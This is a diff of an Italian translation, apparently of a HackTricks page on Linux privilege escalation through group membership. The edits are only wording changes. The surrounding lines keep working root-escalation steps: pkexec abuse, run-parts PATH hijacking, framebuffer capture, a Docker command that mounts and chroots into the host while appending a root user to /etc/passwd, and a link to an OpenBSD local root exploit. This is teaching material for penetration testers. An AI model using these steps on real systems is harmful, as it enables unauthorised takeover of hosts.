@@ -6,7 +6,7 @@
 
 ### **PE - Metodo 1**
 
-**A volte**, **per impostazione predefinita (o perché alcuni software ne hanno bisogno)** all'interno del file **/etc/sudoers** puoi trovare alcune di queste righe:
+**A volte**, **per impostazione predefinita (o perché qualche software ne ha bisogno)** all'interno del **/etc/sudoers** file puoi trovare alcune di queste righe:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -26,7 +26,7 @@ Trova tutti i binari suid e controlla se c'è il binario **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Se scopri che il binario **pkexec è un binario SUID** e appartieni a **sudo** o **admin**, probabilmente potresti eseguire binari come sudo utilizzando `pkexec`.\
+Se scopri che il binario **pkexec è un binario SUID** e appartieni a **sudo** o **admin**, probabilmente potresti eseguire binari come sudo usando `pkexec`.\
 Questo perché tipicamente questi sono i gruppi all'interno della **politica polkit**. Questa politica identifica fondamentalmente quali gruppi possono utilizzare `pkexec`. Controllalo con:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
@@ -88,7 +88,7 @@ $ echo $PATH
 ```
 Se riusciamo a dirottare alcuni programmi in `/usr/local`, possiamo facilmente ottenere i privilegi di root.
 
-Dirottare il programma `run-parts` è un modo semplice per ottenere i privilegi di root, perché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
+Dirottare il programma `run-parts` è un modo semplice per ottenere il root, perché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -96,7 +96,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-o Quando si effettua il login a una nuova sessione ssh.
+o Quando si effettua il login in una nuova sessione ssh.
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -163,7 +163,7 @@ Il **gruppo video** ha accesso per visualizzare l'output dello schermo. Fondamen
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il **`screen.raw`** file e selezionare come tipo di file **Raw image data**:
+Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il **`screen.raw`** file e selezionare come tipo di file **Dati immagine raw**:
 
 ![](<../../../images/image (463).png>)
 
@@ -181,7 +181,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Gruppo Docker
 
-Puoi **montare il filesystem root della macchina host su un volume dell'istanza**, così quando l'istanza si avvia carica immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
+Puoi **montare il filesystem root della macchina host su un volume dell'istanza**, in modo che quando l'istanza si avvia carichi immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
 ```bash
 docker image #Get images from the docker service
 
@@ -193,13 +193,13 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?) puoi sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
+Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?), potresti sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
 
 {{#ref}}
 ../docker-security/
 {{#endref}}
 
-Se hai permessi di scrittura sul socket docker leggi [**questo post su come escalare i privilegi abusando del socket docker**](../#writable-docker-socket)**.**
+Se hai permessi di scrittura sul socket docker leggi [**questo post su come elevare i privilegi abusando del socket docker**](../#writable-docker-socket)**.**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
@@ -219,6 +219,6 @@ Pertanto, se hai compromesso un utente all'interno di questo gruppo dovresti sic
 ## Gruppo Auth
 
 All'interno di OpenBSD il gruppo **auth** di solito può scrivere nelle cartelle _**/etc/skey**_ e _**/var/db/yubikey**_ se vengono utilizzate.\
-Questi permessi possono essere abusati con il seguente exploit per **escalare i privilegi** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Questi permessi possono essere abusati con il seguente exploit per **elevare i privilegi** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 {{#include ../../../banners/hacktricks-training.md}}
